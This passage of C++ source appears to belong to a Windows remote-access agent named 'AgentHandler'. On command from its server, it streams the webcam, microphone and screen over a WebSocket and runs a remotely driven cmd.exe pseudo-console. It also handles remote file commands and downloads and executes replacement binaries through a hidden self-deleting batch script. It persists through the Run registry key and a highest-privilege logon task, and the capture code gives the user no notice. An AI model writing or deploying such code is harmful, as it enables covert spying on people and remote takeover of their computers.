                MFGetStrideForBitmapInfoHeader(MFVideoFormat_RGB24.Data1, width, &stride);
            }
            pCurrentType->Release();
        }

        initialized = true;
        printf("[Webcam] Initialized successfully!\n");
        return true;
    }

    std::vector<BYTE> GetFrame(int quality) {
        if (!initialized) {
            if (!Initialize(m_deviceIndex)) return {};
        }

        HRESULT hr;
        IMFSample* pSample = nullptr;
        DWORD streamIndex, flags;
        LONGLONG timestamp;

        hr = pReader->ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, &streamIndex, &flags, &timestamp, &pSample);
        if (FAILED(hr)) {
            printf("[Webcam] ReadSample failed: 0x%08X\n", hr);
            return {};
        }

        if (flags & MF_SOURCE_READERF_ENDOFSTREAM) {
            printf("[Webcam] End of stream reached\n");
            return {};
        }

        if (!pSample) return {};

        IMFMediaBuffer* pBuffer = nullptr;
        hr = pSample->GetBufferByIndex(0, &pBuffer);
        if (FAILED(hr)) {
            printf("[Webcam] GetBufferByIndex failed: 0x%08X\n", hr);
            pSample->Release();
            return {};
        }

        BYTE* pData = nullptr;
        DWORD currentLength = 0;
        std::vector<BYTE> buffer;
        if (SUCCEEDED(pBuffer->Lock(&pData, nullptr, &currentLength))) {
            Gdiplus::PixelFormat fmt = m_use32Bit ? PixelFormat32bppRGB : PixelFormat24bppRGB;
            Bitmap bitmap(width, height, stride, fmt, pData);
            IStream* pStream = nullptr;
            if (SUCCEEDED(CreateStreamOnHGlobal(NULL, TRUE, &pStream))) {
                CLSID clsid;
                GetEncoderClsid(L"image/jpeg", &clsid);
                
                EncoderParameters encoderParams;
                encoderParams.Count = 1;
                encoderParams.Parameter[0].Guid = EncoderQuality;
                encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
                encoderParams.Parameter[0].NumberOfValues = 1;
                ULONG qual = (ULONG)quality;
                encoderParams.Parameter[0].Value = &qual;

                bitmap.Save(pStream, &clsid, &encoderParams);
                
                LARGE_INTEGER liZero = {};
                pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
                STATSTG statstg;
                pStream->Stat(&statstg, STATFLAG_NONAME);
                ULONG streamSize = (ULONG)statstg.cbSize.QuadPart;
                
                buffer.resize(streamSize);
                ULONG bytesRead;
                pStream->Read(buffer.data(), streamSize, &bytesRead);
                pStream->Release();
            }
            pBuffer->Unlock();
        }
        
        pBuffer->Release();
        pSample->Release();
        return buffer;
    }
};

class AudioStreamer {
    IAudioClient* pAudioClient = nullptr;
    IAudioCaptureClient* pCaptureClient = nullptr;
    bool initialized = false;
    int deviceIndex = 0;
public:
    AudioStreamer(int index) : deviceIndex(index) {}
    ~AudioStreamer() {
        if (pAudioClient) { pAudioClient->Stop(); pAudioClient->Release(); }
        if (pCaptureClient) pCaptureClient->Release();
    }
    std::vector<BYTE> GetAudioBytes() {
        if (!initialized) {
            IMMDeviceEnumerator* pEnumerator = nullptr;
            if (FAILED(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator))) return {};

            IMMDeviceCollection* pCollection = nullptr;
            if (FAILED(pEnumerator->EnumAudioEndpoints(eCapture, DEVICE_STATE_ACTIVE, &pCollection))) {
                pEnumerator->Release();
                return {};
            }

            UINT count = 0;
            pCollection->GetCount(&count);
            if (count == 0) {
                pCollection->Release();
                pEnumerator->Release();
                return {};
            }

            if (deviceIndex < 0 || deviceIndex >= (int)count) deviceIndex = 0;

            IMMDevice* pDevice = nullptr;
            if (FAILED(pCollection->Item(deviceIndex, &pDevice))) {
                pCollection->Release();
                pEnumerator->Release();
                return {};
            }

            if (FAILED(pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient))) {
                pDevice->Release();
                pCollection->Release();
                pEnumerator->Release();
                return {};
            }

            WAVEFORMATEX* pwfx = nullptr;
            pAudioClient->GetMixFormat(&pwfx);

            WAVEFORMATEX wfx = {};
            wfx.wFormatTag = WAVE_FORMAT_PCM;
            wfx.nChannels = 1;
            wfx.nSamplesPerSec = 44100;
            wfx.wBitsPerSample = 16;
            wfx.nBlockAlign = (wfx.nChannels * wfx.wBitsPerSample) / 8;
            wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
            wfx.cbSize = 0;

            if (FAILED(pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_AUTOCONVERTPCM, 10000000, 0, &wfx, NULL))) {
                if (FAILED(pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, 0, 10000000, 0, pwfx, NULL))) {
                pAudioClient->Release(); pAudioClient = nullptr;
                pDevice->Release();
                pCollection->Release();
                pEnumerator->Release();
                return {};
            }
        }
        CoTaskMemFree(pwfx);

        pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pCaptureClient);
        pAudioClient->Start();

        initialized = true;
        pDevice->Release();
        pCollection->Release();
        pEnumerator->Release();
    }

    if (!pCaptureClient) return {};

    std::vector<BYTE> result;
    UINT32 packetLength = 0;
    while (SUCCEEDED(pCaptureClient->GetNextPacketSize(&packetLength)) && packetLength > 0) {
        BYTE* pData = nullptr;
        UINT32 framesAvailable = 0;
        DWORD flags = 0;
        if (SUCCEEDED(pCaptureClient->GetBuffer(&pData, &framesAvailable, &flags, NULL, NULL))) {
            if (!(flags & AUDCLNT_BUFFERFLAGS_SILENT)) {
                result.insert(result.end(), pData, pData + (framesAvailable * 2)); // 16-bit mono = 2 bytes per frame
            }
            pCaptureClient->ReleaseBuffer(framesAvailable);
        } else {
            break;
        }
    }
    return result;
}
};

void StreamFrameLoop(std::string streamType, std::atomic<bool>& runningFlag, std::string mediaType, int deviceIndex) {
HRESULT hrCoInit = CoInitializeEx(NULL, COINIT_MULTITHREADED);
printf("[Stream] Starting %s frame push loop\n", streamType.c_str());

    WebcamStreamer webcam(deviceIndex);
    AudioStreamer mic(deviceIndex);

    int sentCount = 0;
    while (runningFlag && g_state.running && g_state.wsConnected) {
        std::vector<BYTE> data;
        BYTE mediaByte = 0;
        
        if (mediaType == "screen") {
            data = CaptureScreenBytes(50);
            mediaByte = 0x01;
        } else if (mediaType == "cam") {
            data = webcam.GetFrame(50);
            mediaByte = 0x02;
        } else if (mediaType == "mic") {
            data = mic.GetAudioBytes();
            mediaByte = 0x03;
        }

        if (!data.empty()) {
            std::vector<BYTE> wsPacket;
            wsPacket.push_back(mediaByte);
            wsPacket.insert(wsPacket.end(), data.begin(), data.end());

            std::lock_guard<std::mutex> lock(g_state.wsMutex);
            if (g_state.hWebSocket && g_state.wsConnected) {
                DWORD result = WinHttpWebSocketSend(g_state.hWebSocket,
                    WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
                    (PVOID)wsPacket.data(), (DWORD)wsPacket.size());
                
                if (result == ERROR_SUCCESS) {
                    sentCount++;
                    if (sentCount % 100 == 0) {
                        printf("[Stream] Sent %d %s binary packets via WS\n", sentCount, mediaType.c_str());
                    }
                } else {
                    printf("[Stream] WebSocket send binary failed for %s: %d\n", mediaType.c_str(), result);
                    g_state.wsConnected = false;
                }
            }
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(mediaType == "mic" ? 15 : 100));
    }

    if (SUCCEEDED(hrCoInit)) CoUninitialize();
    printf("[Stream] %s frame push loop ended (%d frames sent)\n", streamType.c_str(), sentCount);
}

// Get device name
std::string GetDeviceName() {
    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(hostname, &size);

    char buffer[512];
    WideCharToMultiByte(CP_UTF8, 0, hostname, -1, buffer, sizeof(buffer), nullptr, nullptr);
    return std::string(buffer);
}

// URL encode
std::string UrlEncode(const std::string& str) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex << std::uppercase;

    for (char c : str) {
        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        }
        else {
            escaped << '%' << std::setw(2) << int((unsigned char)c);
        }
    }
    return escaped.str();
}

// Get OS Version
std::string GetOSVersion() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t productName[256];
        DWORD size = sizeof(productName);
        if (RegQueryValueExW(hKey, L"ProductName", nullptr, nullptr, (LPBYTE)productName, &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            char buffer[512];
            WideCharToMultiByte(CP_UTF8, 0, productName, -1, buffer, sizeof(buffer), nullptr, nullptr);
            return std::string(buffer);
        }
        RegCloseKey(hKey);
    }
    return "Windows (Unknown)";
}

// Get System Uptime in MS
unsigned long long GetSystemUptime() {
    return GetTickCount64();
}

bool CreateAutoRestartTask(const std::wstring& appPath) {
    if (Config::DEBUG_MODE || !Config::AUTO_RESTART_ON_CRASH) {
        return true;
    }

    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr)) return false;

    ITaskService* pService = nullptr;
    hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER,
        IID_ITaskService, (void**)&pService);

    if (SUCCEEDED(hr)) {
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

        if (SUCCEEDED(hr)) {
            ITaskFolder* pRootFolder = nullptr;
            hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);

            if (SUCCEEDED(hr)) {
                // Delete existing task
                pRootFolder->DeleteTask(_bstr_t(Config::APP_NAME), 0);

                ITaskDefinition* pTask = nullptr;
                hr = pService->NewTask(0, &pTask);

                if (SUCCEEDED(hr)) {
                    // Set registration info
                    IRegistrationInfo* pRegInfo = nullptr;
                    pTask->get_RegistrationInfo(&pRegInfo);
                    if (pRegInfo) {
                        pRegInfo->put_Author(_bstr_t(L"AgentHandler"));
                        pRegInfo->put_Description(_bstr_t(L"Auto-restart AgentHandler on crash"));
                        pRegInfo->Release();
                    }

                    // Set principal (run with highest privileges)
                    IPrincipal* pPrincipal = nullptr;
                    pTask->get_Principal(&pPrincipal);
                    if (pPrincipal) {
                        pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
                        pPrincipal->Release();
                    }

                    // Set settings
                    ITaskSettings* pSettings = nullptr;
                    pTask->get_Settings(&pSettings);
                    if (pSettings) {
                        pSettings->put_StartWhenAvailable(VARIANT_TRUE);
                        pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
                        pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
                        pSettings->put_RestartCount(3);
                        pSettings->put_RestartInterval(_bstr_t(L"PT1M")); // 1 minute
                        pSettings->Release();
                    }

                    // Create trigger (on logon)
                    ITriggerCollection* pTriggerCollection = nullptr;
                    pTask->get_Triggers(&pTriggerCollection);
                    if (pTriggerCollection) {
                        ITrigger* pTrigger = nullptr;
                        pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
                        if (pTrigger) {
                            ILogonTrigger* pLogonTrigger = nullptr;
                            pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
                            if (pLogonTrigger) {
                                pLogonTrigger->put_Id(_bstr_t(L"LogonTriggerId"));
                                pLogonTrigger->Release();
                            }
                            pTrigger->Release();
                        }
                        pTriggerCollection->Release();
                    }

                    // Create action
                    IActionCollection* pActionCollection = nullptr;
                    pTask->get_Actions(&pActionCollection);
                    if (pActionCollection) {
                        IAction* pAction = nullptr;
                        pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
                        if (pAction) {
                            IExecAction* pExecAction = nullptr;
                            pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                            if (pExecAction) {
                                pExecAction->put_Path(_bstr_t(appPath.c_str()));
                                pExecAction->Release();
                            }
                            pAction->Release();
                        }
                        pActionCollection->Release();
                    }

                    // Register task
                    IRegisteredTask* pRegisteredTask = nullptr;
                    hr = pRootFolder->RegisterTaskDefinition(
                        _bstr_t(Config::APP_NAME),
                        pTask,
                        TASK_CREATE_OR_UPDATE,
                        _variant_t(),
                        _variant_t(),
                        TASK_LOGON_INTERACTIVE_TOKEN,
                        _variant_t(L""),
                        &pRegisteredTask);

                    if (pRegisteredTask) pRegisteredTask->Release();
                    pTask->Release();
                }
                pRootFolder->Release();
            }
        }
        pService->Release();
    }

    CoUninitialize();
    return SUCCEEDED(hr);
}

bool DownloadFile(const std::string& url, const std::wstring& destPath) {
    // Parse URL
    std::wstring wUrl = Utf8ToWide(url);

    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
    wchar_t scheme[32], host[256], path[1024];
    urlComp.lpszScheme = scheme; urlComp.dwSchemeLength = 32;
    urlComp.lpszHostName = host; urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = path; urlComp.dwUrlPathLength = 1024;

    if (!WinHttpCrackUrl(wUrl.c_str(), 0, 0, &urlComp)) return false;

    bool useSSL = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);

    HINTERNET hSession = WinHttpOpen(L"AgentUpdater/1.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, nullptr, nullptr, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
        nullptr, nullptr, nullptr, useSSL ? WINHTTP_FLAG_SECURE : 0);

    bool success = false;
    if (WinHttpSendRequest(hRequest, nullptr, 0, nullptr, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, nullptr)) {

        HANDLE hFile = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0,
            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

        if (hFile != INVALID_HANDLE_VALUE) {
            BYTE buf[8192];
            DWORD bytesRead;
            success = true;
            while (WinHttpReadData(hRequest, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
                DWORD written;
                if (!WriteFile(hFile, buf, bytesRead, &written, nullptr)) {
                    success = false;
                    break;
                }
            }
            CloseHandle(hFile);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}


void PerformUpdate(const std::string& updateUrl) {
    printf("Starting update from: %s\n", updateUrl.c_str());
    
    // 1. Dapatkan path executable saat ini
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring currentPath(exePath);
    
    // 2. Tentukan path temp untuk download
    wchar_t tempDir[MAX_PATH];
    GetTempPathW(MAX_PATH, tempDir);
    std::wstring tempPath = std::wstring(tempDir) + L"agent_update.exe";
    std::wstring batchPath = std::wstring(tempDir) + L"do_update.bat";
    
    // 3. Download file baru
    json statusMsg;
    statusMsg["type"] = "update_status";
    statusMsg["stage"] = "downloading";
    SendWsMessage(statusMsg);
    
    bool downloaded = DownloadFile(updateUrl, tempPath);
    if (!downloaded) {
        json resp;
        resp["type"] = "update_status";
        resp["success"] = false;
        resp["error"] = "Download failed";
        SendWsMessage(resp);
        return;
    }
    
    // 4. Buat batch script yang akan:
    //    - Tunggu process lama mati
    //    - Replace file
    //    - Jalankan yang baru
    DWORD pid = GetCurrentProcessId();
    
    std::wstring batch = L"@echo off\r\n";
    batch += L"timeout /t 2 /nobreak > nul\r\n";
    batch += L":waitloop\r\n";
    batch += L"tasklist /FI \"PID eq " + std::to_wstring(pid) + L"\" 2>NUL | find /I /N \"" + std::to_wstring(pid) + L"\">NUL\r\n";
    batch += L"if \"%ERRORLEVEL%\"==\"0\" goto waitloop\r\n";
    batch += L"copy /Y \"" + tempPath + L"\" \"" + currentPath + L"\"\r\n";
    batch += L"start \"\" \"" + currentPath + L"\"\r\n";
    batch += L"del \"%~f0\"\r\n"; // Self-delete batch
    
    // Tulis batch file
    HANDLE hBatch = CreateFileW(batchPath.c_str(), GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hBatch != INVALID_HANDLE_VALUE) {
        std::string batchUtf8 = WideToUtf8(batch);
        DWORD written;
        WriteFile(hBatch, batchUtf8.c_str(), (DWORD)batchUtf8.size(), &written, nullptr);
        CloseHandle(hBatch);
    }
    
    // 5. Notify server lalu exit
    json resp;
    resp["type"] = "update_status";
    resp["success"] = true;
    resp["stage"] = "applying";
    SendWsMessage(resp);
    
    Sleep(500); // Beri waktu message terkirim
    
    // Jalankan batch script
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESHOWWINDOW;
    PROCESS_INFORMATION pi = {};
    
    std::wstring cmd = L"cmd.exe /C \"" + batchPath + L"\"";
    CreateProcessW(nullptr, (LPWSTR)cmd.c_str(), nullptr, nullptr,
        FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    
    // Exit process agar batch bisa replace file
    g_state.running = false;
    g_state.shouldReconnect = false;
    ExitProcess(0);
}

bool SetAutoStart(const std::wstring& appPath) {
    if (Config::DEBUG_MODE) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueW(hKey, Config::APP_NAME);
            RegCloseKey(hKey);
        }
        return true;
    }

    if (!Config::AUTO_START) return true;

    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    if (result == ERROR_SUCCESS) {
        std::wstring value = L"\"" + appPath + L"\"";
        result = RegSetValueExW(hKey, Config::APP_NAME, 0, REG_SZ,
            (const BYTE*)value.c_str(),
            (DWORD)((value.length() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
        return (result == ERROR_SUCCESS);
    }
    return false;
}

bool CreateConPTY() {
    printf("Loading ConPTY API...\n");
    if (!LoadConPTYAPI()) {
        printf("ConPTY not supported (need Windows 10 1809+)\n");
        return false;
    }

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hPipePTYIn = NULL;
    HANDLE hPipePTYOut = NULL;

    if (!CreatePipe(&hPipePTYIn, &g_state.hPipeOut, &sa, 0)) {
        printf("Failed to create output pipe: %d\n", GetLastError());
        return false;
    }

    if (!CreatePipe(&g_state.hPipeIn, &hPipePTYOut, &sa, 0)) {
        printf("Failed to create input pipe: %d\n", GetLastError());
        CloseHandle(hPipePTYIn);
        CloseHandle(g_state.hPipeOut);
        return false;
    }

    SetHandleInformation(g_state.hPipeIn, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(g_state.hPipeOut, HANDLE_FLAG_INHERIT, 0);

    printf("Pipes created\n");

    COORD consoleSize;
    consoleSize.X = (SHORT)Config::CONSOLE_WIDTH;
    consoleSize.Y = (SHORT)Config::CONSOLE_HEIGHT;

    HRESULT hr = g_CreatePseudoConsole(
        consoleSize,
        hPipePTYIn,
        hPipePTYOut,
        0,
        &g_state.hPseudoConsole
    );

    if (FAILED(hr)) {
        printf("CreatePseudoConsole failed: 0x%08X\n", hr);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        CloseHandle(g_state.hPipeIn);
        CloseHandle(g_state.hPipeOut);
        return false;
    }

    printf("ConPTY created\n");

    SIZE_T attributeListSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeListSize);

    PPROC_THREAD_ATTRIBUTE_LIST attributeList = (PPROC_THREAD_ATTRIBUTE_LIST)
        HeapAlloc(GetProcessHeap(), 0, attributeListSize);

    if (!attributeList) {
        printf("Failed to allocate attribute list\n");
        g_ClosePseudoConsole(g_state.hPseudoConsole);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        return false;
    }

    if (!InitializeProcThreadAttributeList(attributeList, 1, 0, &attributeListSize)) {
        printf("InitializeProcThreadAttributeList failed: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, attributeList);
        g_ClosePseudoConsole(g_state.hPseudoConsole);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        return false;
    }

    if (!UpdateProcThreadAttribute(
        attributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
        g_state.hPseudoConsole,
        sizeof(HPCON),
        NULL,
        NULL
    )) {
        printf("UpdateProcThreadAttribute failed: %d\n", GetLastError());
        DeleteProcThreadAttributeList(attributeList);
        HeapFree(GetProcessHeap(), 0, attributeList);
        g_ClosePseudoConsole(g_state.hPseudoConsole);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        return false;
    }

    printf("Attribute list initialized\n");

    STARTUPINFOEXW startupInfo;
    ZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    startupInfo.lpAttributeList = attributeList;

    PROCESS_INFORMATION processInfo;
    ZeroMemory(&processInfo, sizeof(processInfo));

    wchar_t commandLine[] = L"cmd.exe";

    printf("Creating process: %S\n", commandLine);

    BOOL result = CreateProcessW(
        NULL,
        commandLine,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT,
        NULL,
        NULL,
        &startupInfo.StartupInfo,
        &processInfo
    );

    DeleteProcThreadAttributeList(attributeList);
    HeapFree(GetProcessHeap(), 0, attributeList);

    CloseHandle(hPipePTYIn);
    CloseHandle(hPipePTYOut);

    if (!result) {
        printf("CreateProcess failed: %d\n", GetLastError());
        g_ClosePseudoConsole(g_state.hPseudoConsole);
        CloseHandle(g_state.hPipeIn);
        CloseHandle(g_state.hPipeOut);
        return false;
    }

    g_state.hProcess = processInfo.hProcess;
    CloseHandle(processInfo.hThread);

    printf("Process created (PID: %d)\n", processInfo.dwProcessId);
    Sleep(500);

    return true;
}

void ReadPTYOutput() {
    printf("PTY Reader thread started\n");
    char buffer[8192];
    DWORD bytesRead;

    while (g_state.running && g_state.hPipeIn != INVALID_HANDLE_VALUE) {
        if (g_state.hProcess != INVALID_HANDLE_VALUE) {
            DWORD exitCode;
            if (GetExitCodeProcess(g_state.hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
                printf("PowerShell process exited with code: %d\n", exitCode);
                break;
            }
        }

        DWORD bytesAvail = 0;
        if (!PeekNamedPipe(g_state.hPipeIn, nullptr, 0, nullptr, &bytesAvail, nullptr)) {
            DWORD err = GetLastError();
            if (err == ERROR_BROKEN_PIPE) {
                printf("PTY pipe broken\n");
                break;
            }
            Sleep(100);
            continue;
        }

        if (bytesAvail > 0) {
            if (ReadFile(g_state.hPipeIn, buffer, sizeof(buffer), &bytesRead, nullptr) && bytesRead > 0) {
                json msg;
                msg["type"] = "output";
                msg["output"] = std::string(buffer, bytesRead);

                std::lock_guard<std::mutex> lock(g_state.wsMutex);
                if (g_state.hWebSocket && g_state.wsConnected) {
                    std::string msgStr = msg.dump();
                    DWORD wsResult = WinHttpWebSocketSend(g_state.hWebSocket,
                        WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                        (PVOID)msgStr.c_str(), (DWORD)msgStr.length());

                    if (wsResult != ERROR_SUCCESS) {
                        printf("WebSocket send failed: %d\n", wsResult);
                        g_state.wsConnected = false;
                    }
                }
            }
        }
        else {
            Sleep(50);
        }
    }

    printf("PTY Reader thread stopped\n");
}

void SendPing() {
    std::lock_guard<std::mutex> lock(g_state.wsMutex);
    if (g_state.hWebSocket && g_state.wsConnected) {
        json pingMsg;
        pingMsg["type"] = "ping";
        pingMsg["uptime"] = GetSystemUptime();
        std::string msgStr = pingMsg.dump();
        
        DWORD result = WinHttpWebSocketSend(g_state.hWebSocket,
            WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
            (PVOID)msgStr.c_str(), (DWORD)msgStr.length());
        
        if (result == ERROR_SUCCESS) {
            printf("Keep-alive ping sent (uptime: %llu)\n", pingMsg["uptime"].get<unsigned long long>());
        } else {
            printf("Keep-alive ping failed: %d\n", result);
            g_state.wsConnected = false;
        }
    }
}

void KeepAliveThread() {
    printf("Keep-alive thread started (interval: %d ms)\n", Config::KEEP_ALIVE_INTERVAL_MS);
    g_state.lastPingTime = GetTickCount();
    
    while (g_state.running && g_state.wsConnected) {
        DWORD currentTime = GetTickCount();
        DWORD elapsed = currentTime - g_state.lastPingTime;
        
        if (elapsed >= (DWORD)Config::KEEP_ALIVE_INTERVAL_MS) {
            SendPing();
            g_state.lastPingTime = currentTime;
        }
        
        Sleep(1000);  // Check every second

        // Send metrics every 2 seconds
        if (currentTime - g_state.lastMetricsTime >= 2000) {
            NetStats net = GetNetworkUsage();
            json metrics;
            metrics["type"] = "metrics";
            metrics["data"] = {
                {"cpu", GetCpuUsage()},
                {"ram", GetRamUsage()},
                {"disk", GetDiskUsage()},
                {"netUp", net.upKBps},
                {"netDown", net.downKBps}
            };
            
             std::lock_guard<std::mutex> lock(g_state.wsMutex);
             if (g_state.hWebSocket && g_state.wsConnected) {
                std::string msgStr = metrics.dump();
                WinHttpWebSocketSend(g_state.hWebSocket,
                    WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                    (PVOID)msgStr.c_str(), (DWORD)msgStr.length());
             }
             g_state.lastMetricsTime = currentTime;
        }
    }
    
    printf("Keep-alive thread stopped\n");
}

void WebSocketReceiveLoop() {
    std::vector<BYTE> buffer(65536);

    while (g_state.running && g_state.hWebSocket) {
        DWORD bytesRead = 0;
        WINHTTP_WEB_SOCKET_BUFFER_TYPE bufferType;

        DWORD result = WinHttpWebSocketReceive(g_state.hWebSocket,
            buffer.data(), (DWORD)buffer.size(), &bytesRead, &bufferType);

        if (result != ERROR_SUCCESS || bytesRead == 0) {
            printf("WebSocket disconnected\n");
            g_state.wsConnected = false;
            break;
        }

        try {
            std::string msgStr((char*)buffer.data(), bytesRead);
            json msg = json::parse(msgStr);
            printf("Data: %s\n", msgStr.c_str());

            if (msg["type"] == "input" && msg.contains("data")) {
                std::string data = msg["data"];
                DWORD written;
                WriteFile(g_state.hPipeOut, data.c_str(), (DWORD)data.length(), &written, nullptr);
            }
            else if (msg["type"] == "command" && msg.contains("command")) {
                std::string cmd = msg["command"].get<std::string>() + "\r\n";
                DWORD written;
                WriteFile(g_state.hPipeOut, cmd.c_str(), (DWORD)cmd.length(), &written, nullptr);
            }
            else if (msg["type"] == "action" && msg.contains("action")) {
                std::string action = msg["action"];
                if (action == "screenshot") {
                    printf("Screenshotting...\n");
                    std::string base64Img = CaptureScreenBase64();
                    
                    json resp;
                    resp["type"] = "screenshot";
                    resp["data"] = base64Img;
                    
                    std::string msgStr = resp.dump();
                    
                    std::lock_guard<std::mutex> lock(g_state.wsMutex);
                    if (g_state.hWebSocket && g_state.wsConnected) {
                        printf("Sending screenshot...\n");
                        WinHttpWebSocketSend(g_state.hWebSocket,
                            WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                            (PVOID)msgStr.c_str(), (DWORD)msgStr.length());
                    }
                }
                else if (action == "update") {
                    std::string updateUrl = msg.value("url", "");
                    if (updateUrl.empty()) {
                        json resp;
                        resp["type"] = "update_status";
                        resp["success"] = false;
                        resp["error"] = "No URL provided";
                        SendWsMessage(resp);
                    }
                    else {
                        // Jalankan update di thread terpisah biar ga block receive loop
                        std::thread([updateUrl]() {
                            PerformUpdate(updateUrl);
                            }).detach();
                    }
                }
                else if (action == "list_media_devices") {
                    std::vector<std::string> cameras = EnumerateWebcams();
                    std::vector<std::string> mics = EnumerateMicrophones();

                    json resp;
                    resp["type"] = "media_devices_list";
                    resp["data"] = {
                        {"cameras", cameras},
                        {"mics", mics}
                    };

                    SendWsMessage(resp);
                }
                else if (action == "start_stream") {
                    printf("Stream....\n");
                    std::string media = msg.value("stream", "");
                    int deviceIndex = msg.value("deviceIndex", 0);
                    
                    if (media == "screen") {
                        g_state.isStreamingScreen = true;
                        std::thread(StreamFrameLoop, "video", std::ref(g_state.isStreamingScreen), "screen", deviceIndex).detach();
                    }
                    else if (media == "cam") {
                        g_state.isStreamingCam = true;
                        std::thread(StreamFrameLoop, "video", std::ref(g_state.isStreamingCam), "cam", deviceIndex).detach();
                    }
                    else if (media == "mic") {
                        g_state.isStreamingMic = true;
                        std::thread(StreamFrameLoop, "audio", std::ref(g_state.isStreamingMic), "mic", deviceIndex).detach();
                    }
                }
                else if (action == "stop_stream") {
                    std::string media = msg.value("stream", "");
                    if (media == "screen") g_state.isStreamingScreen = false;
                    else if (media == "cam") g_state.isStreamingCam = false;
                    else if (media == "mic") g_state.isStreamingMic = false;
                }
            }
            else if (msg["type"] == "resize" && msg.contains("cols") && msg.contains("rows")) {
                COORD size = { (SHORT)msg["cols"].get<int>(), (SHORT)msg["rows"].get<int>() };
                if (g_ResizePseudoConsole && g_state.hPseudoConsole) {
                    g_ResizePseudoConsole(g_state.hPseudoConsole, size);
                }
            }
            else if (msg["type"] == "pong") {
                // Server responded to our ping - connection is alive
                printf("Received pong from server\n");
            }
            else if (msg["type"] == "filesystem") {
                // Handle file system commands
                HandleFileSystemCommand(msg);
            }
        }
        catch (...) {
            // Ignore parse errors
        }
    }
}

